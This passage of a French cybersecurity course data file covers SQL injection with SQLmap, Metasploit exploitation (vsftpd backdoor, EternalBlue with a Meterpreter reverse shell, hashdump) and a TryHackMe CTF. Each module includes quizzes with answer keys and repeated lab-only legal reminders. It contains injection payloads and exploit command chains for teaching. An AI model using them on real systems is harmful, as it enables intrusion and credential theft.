      { q: "À quoi sert principalement l'outil Repeater de Burp Suite ?", options: ["À générer automatiquement un rapport de vulnérabilités", "À rejouer et modifier manuellement une requête HTTP interceptée pour l'analyser précisément", "À scanner automatiquement tout un réseau", "À chiffrer les mots de passe de l'application testée"], correct: 1, explanation: "Repeater permet de renvoyer manuellement une requête interceptée, en modifiant ses paramètres, pour observer précisément la réponse du serveur — utile pour valider une hypothèse de vulnérabilité." },
      { q: "Pourquoi utiliser OWASP Juice Shop plutôt qu'un site de production réel pour ce TP ?", options: ["Parce que Juice Shop est plus rapide à charger", "Parce que c'est une application volontairement vulnérable, légale et conçue pour l'entraînement", "Parce que ZAP ne fonctionne que sur Juice Shop", "Parce que les sites de production n'ont jamais de vulnérabilités"], correct: 1, explanation: "Juice Shop est une application développée par l'OWASP spécifiquement pour l'entraînement à la sécurité applicative : elle contient des vulnérabilités intentionnelles et son usage est légal, contrairement à un audit non autorisé sur un site tiers." }
    ]
  },

  {
    id: "S16", week: 16, phase: 3,
    title: "Injections SQL avec SQLmap",
    level: "avance",
    duration: "Semaine 16 · ~8h",
    intro: "L'injection SQL demeure, des années après son apparition, l'une des vulnérabilités les plus dévastatrices : elle peut permettre de lire, modifier ou supprimer l'intégralité d'une base de données. Cette semaine explore son principe technique, l'automatisation de sa détection et de son exploitation avec SQLmap, puis surtout les mesures de prévention côté développement — sur des cibles de laboratoire exclusivement (DVWA, Juice Shop, Mutillidae).",
    objectives: [
      "Expliquer le principe technique d'une injection SQL et ses variantes.",
      "Installer et configurer SQLmap dans un environnement de laboratoire.",
      "Utiliser SQLmap pour détecter et exploiter une injection SQL de manière contrôlée.",
      "Analyser et interpréter les résultats produits par SQLmap.",
      "Proposer des mesures de prévention concrètes (requêtes préparées, validation des entrées)."
    ],
    definition: "Une injection SQL (SQLi) exploite une insuffisance de validation des entrées utilisateur pour injecter du code SQL arbitraire dans une requête destinée à la base de données. SQLmap est un outil open source d'automatisation de la détection et de l'exploitation des injections SQL, capable d'extraire des bases de données, de contourner des protections et, dans certains cas, d'obtenir un accès système.",
    analogy: { title: "📬 L'injection SQL comme une fausse déclaration glissée dans un formulaire", text: "Imaginez un formulaire administratif où un agent copie-colle littéralement le texte que vous écrivez dans une commande interne, sans jamais le vérifier. Si vous écrivez « annule tous les dossiers » à la place de votre nom, l'agent l'exécute tel quel. C'est exactement le principe d'une injection SQL : l'application fait une confiance aveugle à l'entrée utilisateur et l'insère directement dans une commande destinée à la base de données." },
    keyTerms: [
      { term: "Injection SQL In-band", def: "Variante où les résultats de l'injection sont directement visibles dans la réponse de l'application (ex. via UNION SELECT)." },
      { term: "Injection SQL Blind (aveugle)", def: "Variante où aucune donnée n'est directement affichée ; l'attaquant déduit l'information via des réponses booléennes vraies/fausses ou des délais de réponse (time-based)." },
      { term: "Requête préparée (prepared statement)", def: "Technique de développement séparant strictement le code SQL des données utilisateur, neutralisant structurellement l'injection SQL." },
      { term: "Dump de base de données", def: "Extraction complète ou partielle du contenu d'une base de données (tables, colonnes, enregistrements) réalisée lors de l'exploitation d'une injection SQL." }
    ],
    lesson: [
      { heading: "Rappel légal avant toute exploitation", html: "<p>SQLmap peut extraire des données sensibles (mots de passe, informations personnelles) en quelques minutes. Son usage est strictement réservé aux applications de laboratoire autorisées : <strong>DVWA</strong>, <strong>OWASP Juice Shop</strong>, <strong>Mutillidae</strong>, ou toute VM personnelle. Exploiter une injection SQL sur un site tiers, même découverte « par hasard », sans autorisation écrite constitue une infraction grave (accès et maintien frauduleux dans un système, extraction de données).</p>" },
      { heading: "Principe technique de l'injection SQL", html: "<p>Une requête vulnérable typique côté serveur ressemble à :</p><pre><code>-- Requête construite par concaténation, cote applicatif (vulnérable)\nSELECT * FROM users WHERE username = '$input' AND password = '$pass';</code></pre><p>Si <code>$input</code> vaut <code>' OR '1'='1</code>, la requête devient :</p><pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';</code></pre><p>La condition <code>'1'='1'</code> étant toujours vraie, l'authentification peut être contournée. C'est le principe fondamental de l'injection : faire interpréter une donnée comme du code.</p>" },
      { heading: "Installer et configurer SQLmap", html: "<p>SQLmap est préinstallé sur Kali Linux et s'utilise en ligne de commande contre une URL de laboratoire cible.</p><pre><code># Vérifier l'installation\nsqlmap --version\n\n# Détection basique d'une injection sur un paramètre GET (cible DVWA locale)\nsqlmap -u \"http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"PHPSESSID=xxx; security=low\" --batch</code></pre><p>Le paramètre <code>--batch</code> exécute SQLmap sans confirmations interactives, en utilisant les valeurs par défaut — pratique en environnement contrôlé.</p>" },
      { heading: "Utiliser SQLmap pour détecter et exploiter", html: "<p>Une fois une injection détectée, SQLmap permet d'énumérer progressivement la base de données :</p><pre><code># Lister les bases de données disponibles\nsqlmap -u \"http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"PHPSESSID=xxx; security=low\" --dbs\n\n# Lister les tables d'une base précise\nsqlmap -u \"...\" --cookie=\"...\" -D dvwa --tables\n\n# Extraire (dump) le contenu d'une table sensible\nsqlmap -u \"...\" --cookie=\"...\" -D dvwa -T users --dump</code></pre><p>Cette progression — bases, tables, colonnes, données — reproduit fidèlement la démarche d'un attaquant réel, mais ici strictement documentée à des fins pédagogiques.</p>" },
      { heading: "Analyser les résultats de SQLmap", html: "<p>SQLmap précise systématiquement le <em>type</em> d'injection détectée (booléenne, basée sur erreur, UNION-based, time-based) et le <em>payload</em> exact utilisé. L'analyse doit inclure : le paramètre vulnérable, la technique d'injection, le système de gestion de base de données identifié (MySQL, PostgreSQL...), et l'étendue des données accessibles — informations indispensables pour prioriser la remédiation.</p>" },
      { heading: "Mesures de prévention", html: "<p>La prévention de l'injection SQL repose sur des principes de développement sécurisé, en cohérence avec l'OWASP Top 10 (A03 – Injection) :</p><ul><li><strong>Requêtes préparées</strong> (prepared statements) avec paramètres liés — la protection la plus robuste.</li><li><strong>Validation stricte des entrées</strong> (whitelist de caractères autorisés).</li><li><strong>Principe du moindre privilège</strong> pour le compte de base de données utilisé par l'application.</li><li><strong>ORM</strong> (Object-Relational Mapping) bien configuré, qui échappe nativement les entrées.</li><li><strong>Web Application Firewall (WAF)</strong> en défense complémentaire, jamais en remplacement du correctif applicatif.</li></ul>" }
    ],
    standards: ["OWASP Top 10 (2021) — A03: Injection", "CWE-89 — SQL Injection", "MITRE ATT&CK — Technique T1190 (Exploit Public-Facing Application)"],
    steps: [
      { text: "Comprendre en profondeur le principe et les variantes de l'injection SQL.", color: "blue" },
      { text: "Installer et vérifier SQLmap sur Kali Linux.", color: "orange" },
      { text: "Utiliser SQLmap pour détecter et exploiter une injection sur DVWA en laboratoire.", color: "blue" },
      { text: "Analyser les résultats : type d'injection, SGBD, données exposées.", color: "orange" },
      { text: "Proposer des mesures de prévention concrètes et argumentées.", color: "blue" },
      { text: "Livrable : compte-rendu d'exploitation contrôlée et de remédiation.", color: "red" }
    ],
    deliverable: "Un compte-rendu documentant, sur DVWA en environnement de laboratoire (niveau de sécurité low ou medium) : la détection de l'injection, son exploitation via SQLmap jusqu'au dump d'une table, et un plan de remédiation détaillé.",
    tp: {
      title: "TP S16 — Détection et exploitation contrôlée d'une injection SQL sur DVWA",
      objectif: "Détecter, exploiter de manière contrôlée et documenter une injection SQL sur une application volontairement vulnérable, puis proposer des mesures de correction concrètes.",
      duree: "120 minutes",
      materiel: ["VM Kali Linux avec SQLmap", "DVWA (Damn Vulnerable Web Application) déployée en local, niveau de sécurité « low »", "Navigateur avec session DVWA active"],
      consignes: [
        "Rappeler le cadre légal : l'exploitation ne s'effectue que sur l'instance locale de DVWA de l'apprenant, jamais sur une application tierce.",
        "Déployer DVWA en local, se connecter, régler le niveau de sécurité sur « low », puis accéder au module SQL Injection.",
        "Tester manuellement une injection simple dans le champ id (par exemple 1' OR '1'='1) pour observer le comportement de l'application avant automatisation.",
        "Récupérer le cookie de session PHPSESSID et lancer SQLmap avec l'option --batch pour confirmer automatiquement l'injection détectée.",
        "Énumérer progressivement avec SQLmap : bases de données disponibles (--dbs), tables de la base dvwa (--tables), puis dump de la table users (--dump).",
        "Documenter précisément le type d'injection identifié par SQLmap (booléenne, UNION-based, etc.) et le SGBD détecté.",
        "Rédiger une section de remédiation proposant au minimum deux mesures concrètes (requêtes préparées, validation des entrées) applicables au code vulnérable."
      ],
      livrable: "Un compte-rendu d'exploitation contrôlée incluant les commandes SQLmap utilisées, les résultats obtenus (bases, tables, extrait anonymisé du dump), et un plan de remédiation argumenté.",
      criteres: ["L'injection est correctement détectée et confirmée avant l'automatisation SQLmap.", "L'énumération progressive (bases > tables > dump) est menée et documentée avec les commandes exactes.", "Le type d'injection et le SGBD sont correctement identifiés et expliqués.", "Au moins deux mesures de prévention concrètes et pertinentes sont proposées."]
    },
    quiz: [
      { q: "Que réalise techniquement une injection SQL de type payload ' OR '1'='1 sur un champ de connexion vulnérable ?", options: ["Elle chiffre le mot de passe saisi", "Elle transforme la condition de la requête en une expression toujours vraie, pouvant contourner l'authentification", "Elle supprime automatiquement la base de données", "Elle bloque l'accès au serveur web"], correct: 1, explanation: "Le payload injecte une condition logique toujours vraie ('1'='1'), ce qui peut faire retourner un résultat positif à la requête d'authentification quelles que soient les valeurs réellement attendues." },
      { q: "Quelle est la mesure de prévention la plus robuste contre l'injection SQL au niveau du code applicatif ?", options: ["L'utilisation exclusive de HTTPS", "Les requêtes préparées (prepared statements) avec paramètres liés", "L'augmentation de la taille du mot de passe administrateur", "La désactivation du JavaScript côté client"], correct: 1, explanation: "Les requêtes préparées séparent structurellement le code SQL des données fournies par l'utilisateur, empêchant celles-ci d'être interprétées comme du code, quelle que soit leur contenu." },
      { q: "Dans SQLmap, quelle option permet d'exécuter l'outil sans demander de confirmations interactives ?", options: ["--dbs", "--dump", "--batch", "--tables"], correct: 2, explanation: "L'option --batch indique à SQLmap d'utiliser les réponses par défaut à chaque question, ce qui automatise entièrement l'exécution en environnement contrôlé." },
      { q: "Qu'est-ce qu'une injection SQL de type « blind » (aveugle) ?", options: ["Une injection qui affiche directement les données extraites dans la réponse HTTP", "Une injection où l'attaquant déduit l'information via des réponses booléennes ou des délais de réponse, sans affichage direct des données", "Une injection uniquement possible sur des bases de données chiffrées", "Une injection qui ne fonctionne que sur les formulaires de recherche"], correct: 1, explanation: "L'injection blind ne renvoie aucune donnée visible directement ; l'attaquant doit déduire des informations bit par bit en observant des différences de comportement (vrai/faux) ou de temps de réponse (time-based)." },
      { q: "À quelle catégorie de l'OWASP Top 10 (2021) appartient l'injection SQL ?", options: ["A01 – Broken Access Control", "A05 – Security Misconfiguration", "A03 – Injection", "A09 – Security Logging and Monitoring Failures"], correct: 2, explanation: "L'injection SQL appartient à la catégorie A03 – Injection de l'OWASP Top 10 (2021), qui regroupe l'ensemble des failles où des données non fiables sont interprétées comme du code par un interpréteur (SQL, OS, LDAP, etc.)." }
    ]
  },

  {
    id: "S17", week: 17, phase: 3,
    title: "Exploitation avec Metasploit",
    level: "avance",
    duration: "Semaine 17 · ~9h",
    intro: "Metasploit Framework est l'outil d'exploitation le plus utilisé au monde en test d'intrusion, structurant en un environnement unifié la recherche d'exploits, leur exécution, l'usage de payloads et la post-exploitation. Cette semaine, la plus sensible du programme, se pratique intégralement contre des machines volontairement vulnérables (Metasploitable) — jamais contre un système réel non autorisé.",
    objectives: [
      "Comprendre l'architecture de Metasploit Framework (exploits, payloads, encoders, auxiliary).",
      "Rechercher et sélectionner un exploit adapté à une vulnérabilité identifiée.",
      "Configurer et lancer un exploit contre une cible de laboratoire.",
      "Utiliser un payload (Meterpreter) pour établir un accès à distance.",
      "Réaliser des actions de post-exploitation de base et les documenter."
    ],
    definition: "Metasploit Framework est une plateforme open source (Rapid7) unifiant la recherche de vulnérabilités, le développement et l'exécution d'exploits, la génération de payloads et la post-exploitation. Il s'articule autour de msfconsole, l'interface en ligne de commande principale, et d'une base de modules classés en exploits, payloads, auxiliary, encoders et post.",
    analogy: { title: "🎯 Metasploit comme le simulateur de vol du pilote de chasse", text: "Un pilote de chasse ne s'entraîne jamais directement en situation réelle de combat : il utilise un simulateur reproduisant fidèlement les conditions, sans risque réel. Metasploit contre une machine Metasploitable joue ce rôle : reproduire fidèlement une exploitation réelle, dans un environnement totalement contrôlé et sans conséquence sur un tiers." },
    keyTerms: [
      { term: "Exploit", def: "Module Metasploit exploitant une vulnérabilité précise (souvent référencée par un CVE) pour obtenir une exécution de code sur la cible." },
      { term: "Payload", def: "Code exécuté sur la machine cible après le succès d'un exploit ; Meterpreter est le payload avancé le plus utilisé, offrant un shell interactif riche en mémoire." },
      { term: "Meterpreter", def: "Payload avancé de Metasploit s'exécutant en mémoire, offrant des commandes de post-exploitation (capture d'écran, keylogging, pivoting, extraction de hash) sans écrire sur le disque cible." },
      { term: "Post-exploitation", def: "Ensemble des actions menées après un accès initial réussi : élévation de privilèges, persistance, mouvement latéral, exfiltration — toutes documentées à des fins de rapport, jamais destructrices." }
    ],
    lesson: [
      { heading: "Rappel légal — la semaine la plus sensible", html: "<p>Cette semaine manipule des exploits réels capables de compromettre un système. Leur usage est <strong>strictement limité</strong> à des machines de laboratoire dédiées : Metasploitable 2/3, machines TryHackMe/HackTheBox explicitement autorisées pour l'exploitation. Utiliser Metasploit contre un système tiers sans autorisation écrite constitue un accès frauduleux à un système de traitement automatisé de données, sévèrement sanctionné dans la quasi-totalité des législations, y compris au Bénin.</p>" },
      { heading: "Architecture de Metasploit Framework", html: "<p>Metasploit s'articule autour de msfconsole et de cinq grandes familles de modules :</p><ul><li><strong>exploits/</strong> : code exploitant une vulnérabilité précise.</li><li><strong>payloads/</strong> : code exécuté après compromission (ex. Meterpreter, shell inverse).</li><li><strong>auxiliary/</strong> : modules de scan, de fuzzing, ou de force brute (sans exploitation directe).</li><li><strong>encoders/</strong> : encodage des payloads pour éviter certaines détections basiques (usage pédagogique uniquement en laboratoire).</li><li><strong>post/</strong> : modules de post-exploitation (extraction de hash, énumération système).</li></ul><pre><code># Lancer la console Metasploit\nmsfconsole\n\n# Afficher le nombre de modules chargés\nmsf6 > banner</code></pre>" },
      { heading: "Rechercher et sélectionner un exploit", html: "<p>La recherche d'un exploit part généralement des résultats de reconnaissance (S14) : un service et sa version identifiés par Nmap orientent la recherche.</p><pre><code># Rechercher un exploit lié à un service identifié en reconnaissance (exemple pédagogique : vsftpd 2.3.4 sur Metasploitable)\nmsf6 > search vsftpd\n\n# Sélectionner le module correspondant\nmsf6 > use exploit/unix/ftp/vsftpd_234_backdoor\n\n# Afficher les options requises par le module\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > options</code></pre><p>Cet exploit cible une backdoor volontairement présente dans la version 2.3.4 de vsftpd fournie avec Metasploitable — un cas d'école classique pour l'apprentissage.</p>" },
      { heading: "Configurer et lancer l'exploit avec un payload", html: "<p>Une fois le module sélectionné, il faut configurer la cible (RHOSTS), et éventuellement le payload.</p><pre><code>msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LPORT 4444\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > run\n\n# Pour un exploit nécessitant un payload Meterpreter (exemple générique) :\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(...) > set RHOSTS 192.168.56.102\nmsf6 exploit(...) > set LHOST 192.168.56.100\nmsf6 exploit(...) > exploit</code></pre><p>L'adresse <code>192.168.56.100</code> (LHOST) correspond à la machine Kali attaquante, toutes deux dans le même réseau Host-Only isolé.</p>" },
      { heading: "Post-exploitation avec Meterpreter", html: "<p>Une fois une session Meterpreter obtenue, plusieurs commandes permettent une reconnaissance et une documentation de l'accès obtenu, à des fins strictement pédagogiques et de rapport :</p><pre><code>meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > screenshot\nmeterpreter > hashdump\nmeterpreter > background</code></pre><p>En contexte professionnel réel, ces actions doivent rester dans le périmètre défini par les Rules of Engagement, et toute donnée extraite (comme des hashs de mots de passe) est traitée avec la plus grande confidentialité et détruite après le rapport.</p>" },
      { heading: "Documenter un scénario d'exploitation", html: "<p>Un scénario d'exploitation professionnel retrace, étape par étape, la chaîne complète : vulnérabilité identifiée (avec CVE si applicable), exploit utilisé, payload déployé, preuve d'accès obtenue, actions de post-exploitation réalisées, et recommandations de remédiation — c'est cette structure qui constitue le livrable attendu.</p>" }
    ],
    standards: ["MITRE ATT&CK — Tactiques Initial Access (TA0001) et Execution (TA0002)", "CVE / CVSS — Common Vulnerabilities and Exposures / Common Vulnerability Scoring System", "PTES — Exploitation et Post-Exploitation"],
    steps: [
      { text: "Étudier l'architecture de Metasploit Framework (exploits, payloads, auxiliary, post).", color: "blue" },
      { text: "Rechercher un exploit adapté à partir des résultats de reconnaissance (S14).", color: "orange" },
      { text: "Configurer et lancer un exploit contre une VM Metasploitable en laboratoire.", color: "blue" },
      { text: "Déployer un payload Meterpreter et établir une session interactive.", color: "orange" },
      { text: "Réaliser des actions de post-exploitation documentées à but pédagogique.", color: "blue" },
      { text: "Livrable : scénario d'exploitation entièrement documenté.", color: "red" }
    ],
    deliverable: "Un scénario d'exploitation documenté (Markdown ou PDF) retraçant, contre une VM Metasploitable en laboratoire : reconnaissance préalable, sélection de l'exploit, configuration, obtention d'une session Meterpreter, actions de post-exploitation, et recommandations de remédiation.",
    tp: {
      title: "TP S17 — Chaîne d'exploitation complète sur Metasploitable en laboratoire",
      objectif: "Mener une chaîne d'exploitation complète, de la reconnaissance à la post-exploitation, contre une machine volontairement vulnérable, dans le strict respect du cadre légal du laboratoire.",
      duree: "120–150 minutes",
      materiel: ["VM Kali Linux avec Metasploit Framework", "VM Metasploitable 2, réseau Host-Only isolé", "Résultats de reconnaissance Nmap de la semaine S14 (ou nouveau scan)"],
      consignes: [
        "Rappeler explicitement le cadre légal : cette exploitation ne s'exécute que contre la VM Metasploitable personnelle, isolée en réseau Host-Only, jamais contre un système tiers.",
        "Relancer un scan Nmap de reconnaissance (-sV) sur la cible pour identifier au moins un service exploitable (ex. vsftpd 2.3.4, Samba, ou autre service Metasploitable connu).",
        "Dans msfconsole, rechercher (search) un exploit correspondant au service identifié et sélectionner le module avec use.",
        "Configurer les options requises (RHOSTS, RPORT, et LHOST/LPORT si un payload reverse est nécessaire) et vérifier la configuration avec options.",
        "Lancer l'exploit (run ou exploit) et confirmer l'obtention d'un accès (shell ou session Meterpreter).",
        "Exécuter au moins trois commandes de post-exploitation documentaires (sysinfo, getuid, et une commande d'énumération) sans action destructrice.",
        "Rédiger le scénario d'exploitation complet, de la reconnaissance à la recommandation de remédiation, avec captures d'écran à l'appui."
      ],
      livrable: "Un scénario d'exploitation documenté avec captures d'écran, incluant chaque commande utilisée, les résultats obtenus, et une section de remédiation.",
      criteres: ["La chaîne complète (reconnaissance, sélection d'exploit, exploitation, post-exploitation) est menée et documentée.", "Les commandes Metasploit sont correctement utilisées et expliquées.", "Aucune action destructrice ou hors périmètre n'est réalisée sur la VM cible.", "Le rapport final inclut des recommandations de remédiation cohérentes avec la vulnérabilité exploitée."]
    },
    quiz: [
      { q: "Dans l'architecture de Metasploit, quel type de module correspond au code exécuté sur la machine cible après le succès d'un exploit ?", options: ["auxiliary", "payload", "encoder", "post"], correct: 1, explanation: "Le payload est le code livré et exécuté sur la cible une fois l'exploit réussi ; Meterpreter en est l'exemple le plus avancé, offrant un shell interactif riche fonctionnant en mémoire." },
      { q: "Que signifie RHOSTS dans la configuration d'un module Metasploit ?", options: ["Le port local d'écoute de l'attaquant", "L'adresse IP de la machine attaquante (Kali)", "L'adresse IP ou la plage d'adresses de la machine cible", "Le nom du payload utilisé"], correct: 2, explanation: "RHOSTS désigne l'adresse ou la plage d'adresses de la ou des machines cibles visées par le module, à distinguer de LHOST qui désigne la machine de l'attaquant." },
      { q: "Pourquoi Meterpreter est-il considéré comme un payload avancé par rapport à un simple shell inversé ?", options: ["Parce qu'il s'exécute uniquement sur Linux", "Parce qu'il fonctionne en mémoire et offre des commandes de post-exploitation étendues (screenshot, hashdump, etc.)", "Parce qu'il ne nécessite aucune configuration réseau", "Parce qu'il chiffre automatiquement toute la base de données cible"], correct: 1, explanation: "Meterpreter s'exécute directement en mémoire (réduisant les traces disque) et propose un ensemble riche de commandes post-exploitation, contrairement à un shell inversé basique qui se limite à l'exécution de commandes système." },
      { q: "Dans quel cadre légal est-il acceptable de lancer un exploit Metasploit contre une machine ?", options: ["Dès lors que la machine est vulnérable et facilement accessible", "Uniquement contre une machine que l'on possède ou pour laquelle on dispose d'une autorisation écrite explicite", "Si l'exploit est disponible publiquement sur Metasploit", "Si aucune donnée n'est modifiée pendant le test"], correct: 1, explanation: "La disponibilité publique d'un exploit ou la simple présence d'une vulnérabilité ne rend jamais son exploitation légale sans autorisation écrite explicite du propriétaire du système." },
      { q: "Que représente un identifiant CVE associé à un exploit Metasploit ?", options: ["Le numéro de version de Metasploit Framework", "Un identifiant standardisé référençant une vulnérabilité publiquement connue", "Le score de sévérité de l'exploit sur 10", "Le nom du payload par défaut du module"], correct: 1, explanation: "CVE (Common Vulnerabilities and Exposures) est un système d'identification standardisé et public des vulnérabilités connues, souvent complété par un score CVSS qui en mesure la sévérité." }
    ]
  },

  {
    id: "S18", week: 18, phase: 3,
    title: "Projet de phase 3 — Mini CTF",
    level: "avance",
    duration: "Semaine 18 · ~10h",
    intro: "Cette semaine conclut la Phase 3 par une mise en pratique intégrée : un mini Capture The Flag (CTF) sur la plateforme légale TryHackMe. L'objectif n'est plus d'apprendre un outil isolé, mais de mobiliser toute la chaîne méthodologique acquise depuis S13 — reconnaissance, analyse web, injection, exploitation — face à des machines inconnues, dans un cadre 100% légal et encadré.",
    objectives: [
      "S'inscrire et se repérer sur une plateforme de CTF légale (TryHackMe).",
      "Résoudre méthodiquement au moins deux machines de niveau débutant/intermédiaire.",
      "Documenter chaque étape de résolution avec rigueur (méthodologie PTES).",
      "Participer activement à un débriefing collectif et comparer les approches.",
      "Rédiger un write-up de CTF complet et professionnel."
    ],
    definition: "Un CTF (Capture The Flag) est une épreuve de cybersécurité légale où le participant doit résoudre des défis techniques (souvent des machines virtuelles vulnérables) pour retrouver des « flags » (chaînes de caractères prouvant la compromission). TryHackMe est une plateforme en ligne proposant des environnements de laboratoire légaux, guidés ou libres, pour s'entraîner en toute légalité.",
    analogy: { title: "🏆 Le CTF comme l'examen pratique du permis de conduire", text: "Après des semaines de cours théoriques et d'exercices isolés (créneau, freinage, priorités), l'examen du permis de conduire met tout bout à bout dans un parcours réel supervisé. Le mini CTF de cette semaine joue exactement ce rôle : mobiliser Nmap, ZAP, SQLmap et Metasploit ensemble, sur des machines inconnues, dans un cadre légal et supervisé." },
    keyTerms: [
      { term: "Flag", def: "Chaîne de caractères unique (souvent au format flag{...} ou similaire) prouvant qu'une étape ou une machine a été compromise avec succès dans un CTF." },
      { term: "Write-up", def: "Document rédigé après résolution d'un défi ou d'une machine, détaillant méthodiquement chaque étape de la démarche, des outils utilisés et du raisonnement suivi." },
      { term: "Rabbit hole", def: "Piste d'investigation qui semble prometteuse mais qui s'avère être une impasse, consommant du temps sans mener à une compromission ; savoir l'identifier est une compétence clé du pentester." },
      { term: "Privilege escalation", def: "Étape consistant, après un accès initial limité, à obtenir des privilèges plus élevés (utilisateur standard vers administrateur/root) sur le système compromis." }
    ],
    lesson: [
      { heading: "Pourquoi TryHackMe pour ce projet final ?", html: "<p>TryHackMe est une plateforme légale et supervisée : chaque machine est hébergée dans une infrastructure dédiée, isolée, et son exploitation est explicitement autorisée par les conditions d'utilisation de la plateforme. C'est la garantie que l'intégralité des techniques enseignées depuis S13 peut être mobilisée sans aucune ambiguïté légale, contrairement à toute cible extérieure à la plateforme.</p>" },
      { heading: "S'inscrire et se repérer sur TryHackMe", html: "<p>L'inscription est gratuite pour l'essentiel des salles de niveau débutant/intermédiaire pertinentes pour ce projet.</p><pre><code># Étapes d'inscription (dans le navigateur, pas en ligne de commande) :\n# 1. Créer un compte sur tryhackme.com\n# 2. Rejoindre la salle recommandée par l'instructeur (ex. « Vulnversity » ou « Basic Pentesting »)\n# 3. Se connecter au VPN TryHackMe via OpenVPN depuis Kali :\nsudo openvpn votre-fichier-connexion.ovpn</code></pre><p>Une fois le VPN actif, la machine cible de la salle devient accessible depuis Kali, exactement comme une machine de laboratoire personnelle.</p>" },
      { heading: "Méthodologie de résolution d'une machine CTF", html: "<p>La résolution suit la même logique que les semaines précédentes, appliquée cette fois à une cible inconnue :</p><ul><li><strong>Reconnaissance</strong> : scan Nmap complet pour cartographier les services exposés.</li><li><strong>Énumération</strong> : approfondissement de chaque service (web, FTP, SMB...) avec les outils adaptés (ZAP, SQLmap si pertinent, énumération manuelle).</li><li><strong>Exploitation</strong> : recherche et utilisation d'un exploit (Metasploit ou manuel) pour obtenir un accès initial.</li><li><strong>Privilege escalation</strong> : élévation de privilèges pour atteindre le flag final (souvent situé dans un répertoire administrateur).</li></ul><pre><code># Exemple de démarrage de résolution (cible TryHackMe attribuée à l'apprenant)\nnmap -sV -A 10.10.x.x -oN recon_machine1.txt</code></pre>" },
      { heading: "Documenter chaque étape en temps réel", html: "<p>La rigueur de documentation est aussi importante que la résolution elle-même : chaque commande exécutée, chaque résultat obtenu et chaque hypothèse testée (même infructueuse) doivent être notés au fur et à mesure, pas reconstitués après coup. Cette discipline reproduit exactement les exigences d'un rapport de pentest professionnel.</p>" },
      { heading: "Le débriefing collectif", html: "<p>Après résolution individuelle ou en petit groupe, un débriefing collectif permet de comparer les cheminements : plusieurs voies mènent souvent au même flag, et confronter les approches (outils choisis, ordre des étapes, rabbit holes rencontrés) est l'un des apprentissages les plus formateurs du CTF — une pratique courante dans les équipes de pentest professionnelles (peer review).</p>" },
      { heading: "Rédiger un write-up professionnel", html: "<p>Un write-up de qualité professionnelle suit une structure claire : résumé de la machine, reconnaissance (résultats Nmap), énumération détaillée, chaîne d'exploitation pas à pas (avec commandes et captures), élévation de privilèges, flags obtenus, et enfin les leçons retenues. C'est ce document qui constitue le livrable final de toute la Phase 3.</p>" }
    ],
    standards: ["PTES — Méthodologie complète (Pre-engagement à Reporting)", "MITRE ATT&CK — Tactiques Reconnaissance, Initial Access, Execution, Privilege Escalation", "EC-Council CEH / eJPT — Méthodologie d'examen pratique"],
    steps: [
      { text: "S'inscrire sur TryHackMe et configurer l'accès VPN depuis Kali.", color: "blue" },
      { text: "Résoudre méthodiquement une première machine de niveau débutant.", color: "orange" },
      { text: "Résoudre une deuxième machine en mobilisant reconnaissance, exploitation et élévation de privilèges.", color: "blue" },
      { text: "Documenter chaque étape en temps réel (commandes, résultats, hypothèses).", color: "orange" },
      { text: "Participer au débriefing collectif et comparer les approches.", color: "blue" },
      { text: "Livrable : write-up de CTF complet et professionnel.", color: "red" }
    ],
    deliverable: "Un write-up de CTF professionnel (Markdown ou PDF) couvrant la résolution complète de deux machines TryHackMe, structuré en reconnaissance, énumération, exploitation, élévation de privilèges et leçons retenues, clôturant la Phase 3 du programme HACKINÉTIQUE.",
    tp: {
      title: "TP S18 — Mini CTF encadré sur TryHackMe",
      objectif: "Mobiliser l'ensemble des compétences acquises en Phase 3 (reconnaissance, analyse web, injection, exploitation) pour résoudre deux machines CTF légales et en rédiger un write-up professionnel.",
      duree: "3 à 5 heures (réparties sur la semaine)",
      materiel: ["VM Kali Linux complète (Nmap, ZAP, SQLmap, Metasploit)", "Compte TryHackMe et accès VPN configuré", "Deux machines TryHackMe de niveau débutant/intermédiaire assignées par l'instructeur"],
      consignes: [
        "Rappeler le cadre légal : seules les machines officiellement hébergées par TryHackMe et accessibles via le VPN de la plateforme peuvent être ciblées ; aucune autre cible n'est autorisée.",
        "Créer un compte TryHackMe, rejoindre la salle assignée, et établir la connexion VPN depuis la VM Kali.",
        "Sur la première machine, effectuer une reconnaissance Nmap complète, énumérer les services exposés, puis progresser vers l'accès initial et le premier flag (user flag).",
        "Poursuivre par l'élévation de privilèges jusqu'à l'obtention du flag administrateur (root/system flag), en documentant chaque tentative, y compris les échecs.",
        "Répéter la démarche sur une deuxième machine de complexité comparable ou légèrement supérieure.",
        "Participer au débriefing collectif organisé par l'instructeur : présenter sa méthode, comparer avec les autres apprenants, identifier les rabbit holes rencontrés.",
        "Rédiger le write-up final structuré (résumé, reconnaissance, énumération, exploitation, privilege escalation, flags, leçons retenues) pour les deux machines."
      ],
      livrable: "Un write-up de CTF complet couvrant les deux machines résolues, avec captures d'écran des flags obtenus, commandes utilisées et section de leçons retenues.",
      criteres: ["Les deux machines sont résolues (ou la démarche est documentée avec justification en cas de blocage partiel).", "Chaque étape (reconnaissance, énumération, exploitation, élévation de privilèges) est clairement documentée avec preuves.", "Le write-up respecte une structure professionnelle claire et lisible.", "L'apprenant a activement participé au débriefing collectif et intègre les retours dans sa réflexion finale."]
    },
    quiz: [
      { q: "Pourquoi TryHackMe constitue-t-il un cadre légal approprié pour ce projet final de Phase 3 ?", options: ["Parce que la plateforme est gratuite", "Parce que les machines sont hébergées et explicitement mises à disposition par la plateforme pour l'entraînement légal", "Parce qu'aucune règle n'encadre son utilisation", "Parce qu'elle ne nécessite pas de VPN"], correct: 1, explanation: "TryHackMe héberge des machines volontairement vulnérables dans une infrastructure dédiée, dont l'exploitation par les utilisateurs inscrits est explicitement autorisée par les conditions d'utilisation de la plateforme." },
